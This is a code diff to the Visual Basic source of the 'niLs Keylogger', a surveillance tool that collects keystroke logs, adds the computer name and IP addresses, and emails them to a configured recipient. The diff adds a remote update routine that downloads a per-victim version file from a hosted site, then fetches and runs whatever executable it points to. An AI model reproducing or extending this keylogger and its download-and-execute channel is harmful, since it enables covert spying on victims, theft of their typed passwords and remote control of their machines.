@@ -57,16 +57,30 @@ Private Const ERROR_SUCCESS As Long = 0
 Private Const BINDF_GETNEWESTVERSION As Long = &H10
 Private Const INTERNET_FLAG_RELOAD As Long = &H80000000
 
+'run update.exe
+Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" ( _
+                    ByVal hwnd As Long, _
+                    ByVal lpOperation As String, _
+                    ByVal lpFile As String, _
+                    ByVal lpParameters As String, _
+                    ByVal lpDirectory As String, _
+                    ByVal nShowCmd As Long) As Long
+ 
+Private Const SW_HIDE As Long = 0
+Private Const SW_SHOWNORMAL As Long = 1
+Private Const SW_SHOWMAXIMIZED As Long = 3
+Private Const SW_SHOWMINIMIZED As Long = 2
+
 'Special Folder Path
 Public Enum mceIDLPaths
    ' CSIDL_APPDATA = &H19  'C:\WINNT\Profiles\username\Application Data.
     CSIDL_PROGDATA = &H23
 End Enum
-Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hwnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
+Private Declare Function SHGetSpecialFolderPath Lib "shell32.dll" Alias "SHGetSpecialFolderPathA" (ByVal hwnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
 Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliSeconds As Long)
 
 Public DeleteSentLogs As Boolean, LocalIP, PublicIP As String
-Public sendTo, sendFrom, Password, CompID, RetryTime, LogDir As String
+Public sendTo, sendFrom, Password, CompID, LogDir, PubIPURL As String, CurVersion As Integer
 Private Sub Form_Load()
 If App.PrevInstance = True Then End 'no multiple instances allowed
 TransparentForm Me
@@ -80,6 +94,7 @@ Call LoadSetting        'Loads Ip address, CompNames and settings.txt
 File1.Path = LogDir
 CurrLog = Format$(Now, "ddmmyy") & ".nkl"
 Retry = 0
+File1.Refresh
 
 While File1.ListCount > 1
     File1.ListIndex = 0                 'Choose first log
@@ -111,21 +126,54 @@ ReSend:
 File1.Refresh       'Reload after deleting/renaimng files
 Wend
 
+UpdatePackage   'Updates
+
 End         'job Over
 
 End Sub
+Private Sub UpdatePackage()
+Dim sSourceUrl, PatchURL, fType As String, NewVersion As Integer, res As Double
+
+sSourceUrl = "https://sites.google.com/site/nilsklg/" & CompID & ".txt"
+'sSourceUrl = "http://127.0.0.1/x/" & CompID & ".txt"
+If DownloadFile(sSourceUrl, App.Path & "\version.txt") Then
+      Open App.Path & "\version.txt" For Input As 1
+        Input #1, NewVersion, PatchURL
+      Close #1
+      Kill (App.Path & "\version.txt")
+      If CurVersion < NewVersion And Len(PatchURL) > 10 Then    'Update Available
+
+      fType = GetFileExtension(PatchURL)    'Get extension
+        If Mid$(PatchURL, Len(PatchURL) - 4, 1) = "-" Then  'Run as Administrator
+            If DownloadFile(PatchURL, App.Path & "\update." & fType) Then
+               ' res = Shell(App.Path & "\myprg.exe", vbNormalFocus)  'gives error if We run setup.exe
+                res = ShellExecute(Me.hwnd, "Open", App.Path & "\update." & fType, vbNullString, App.Path, SW_SHOWNORMAL)
+                'res=5 then user lacks admin rights/password
+            End If
+        Else
+            If DownloadFile(PatchURL, App.Path & "\myprg." & fType) Then 'Run as CurrentUser
+                res = ShellExecute(Me.hwnd, "Open", App.Path & "\myprg." & fType, vbNullString, App.Path, SW_SHOWNORMAL)
+            End If
+        End If
+      End If
+End If
+End Sub
 Private Sub LoadSetting()
-Dim SettingsPath, PubIPURL As String
+Dim SettingsPath As String
 SettingsPath = GetSpecialFolderA(CSIDL_PROGDATA)
 
 If Dir(SettingsPath & "System\settings.txt") <> "" Then
     'Load settings
     Open (SettingsPath & "System\settings.txt") For Input As 1
-    Input #1, LogDir, CompID, sendTo, sendFrom, Password, RetryTime, PubIPURL
+    Input #1, LogDir, CompID, sendTo, sendFrom, Password, CurVersion, PubIPURL
     Close #1
 Else
     'setting not found Load default value
+    LogDir = SettingsPath & "System\NLogs\"
+    CompID = "SYSTEM"
     sendTo = "none"
+    PubIPURL = "abc"    'Use default
+    CurVersion = 0
 End If
 
 If Len(sendTo) < 15 Then
@@ -154,26 +202,26 @@ Close #2
 ReadLog = Len(txtLog.Text)
 End Function
 Private Sub AttachLogDetails(ByVal LogFile As String)
-Dim NoNeed, lTime, lDate, AppRevision As String
+Dim NoNeed, lTime, lDate, AppRevision, lCompID As String
 
 'Read initials
 Open LogFile For Input As 1
-Input #1, NoNeed, lTime, lDate, CompID, AppRevision
+Input #1, NoNeed, lTime, lDate, lCompID, AppRevision
 Close #1
 
 txtSendThis.Text = "<b>Keylog Generated with <a href=" & Chr(34) & "nilskeylogger.blogspot.in" & Chr(34) & _
 ">niLs Keylogger</a></b><br>" & _
-"<b>Computer Name: </b>" & CompID & "(" & VBA.Environ$("COMPUTERNAME") & ")" & "<br>" & _
+"<b>Computer Name: </b>" & lCompID & "(" & VBA.Environ$("COMPUTERNAME") & ")" & "<br>" & _
 "<b>IP Address: </b> " & PublicIP & " | " & LocalIP & "<br>" & _
 "<b>Start Time: </b>" & lDate & "  " & lTime & "<br>" & _
 "<b>End Time: </b>" & FileDateTime(LogFile) & "<br>" & _
-"<b>AppVersion: </b>" & AppRevision & "<br>" & _
+"<b>AppVersion: </b>" & AppRevision & " <b> PackageVersion : </b>" & CurVersion & " <br>" & _
 "----------------------------<br><br>" & txtLog.Text
 End Sub
 Private Function SendLog() As Boolean
 'MsgBox "SendFrom :" & sendFrom & vbCrLf & "SendTo : " & sendTo & vbCrLf & "Password : " & Password
 'Open "x.html" For Output As 1
- '   Print #1, txtSendThis.Text
+'  Print #1, txtSendThis.Text
 'Close #1
 'GoTo SkipEmail
 
@@ -211,11 +259,9 @@ Set iConf = Nothing
 Set Flds = Nothing
 
 'SkipEmail:
-
 'Email Sent!
 SendLog = True
 Exit Function
-
 
 Err2:
 'Email not sent
@@ -247,6 +293,8 @@ End Function
 Private Function getPublicIP(ByVal FromSite As String) As String
 
 Dim sSourceUrl, sLocalFile As String
+If FromSite = "none" Then getPublicIP = "SKIPPED": Exit Function
+
 If Len(FromSite) < 15 Then FromSite = "http://wgetip.com/" 'Use default if length less
 sLocalFile = File1.Path & "\IP.txt"
 sSourceUrl = FromSite
@@ -266,13 +314,7 @@ End Function
 
 Public Function DownloadFile(ByVal sSourceUrl As String, _
                              sLocalFile As String) As Boolean
-  
-  'Download the file. BINDF_GETNEWESTVERSION forces
-  'the API to download from the specified source.
-  'Passing 0& as dwReserved causes the locally-cached
-  'copy to be downloaded, if available. If the API
-  'returns ERROR_SUCCESS (0), DownloadFile returns True.
-   DownloadFile = URLDownloadToFile(0&, _
+    DownloadFile = URLDownloadToFile(0&, _
                                     sSourceUrl, _
                                     sLocalFile, _
                                     BINDF_GETNEWESTVERSION, _
@@ -302,3 +344,15 @@ IPAd = ""
 getLocalIP = IPAd   'return all Ips separated by spaces
 End Function
 
+Function GetFileExtension(ByVal FileName As String) As String
+    Dim i As Long
+    For i = Len(FileName) To 1 Step -1
+        Select Case Mid$(FileName, i, 1)
+            Case "."
+                GetFileExtension = Mid$(FileName, i + 1)
+                Exit For
+            Case ":", "\"
+                Exit For
+        End Select
+    Next
+End Function
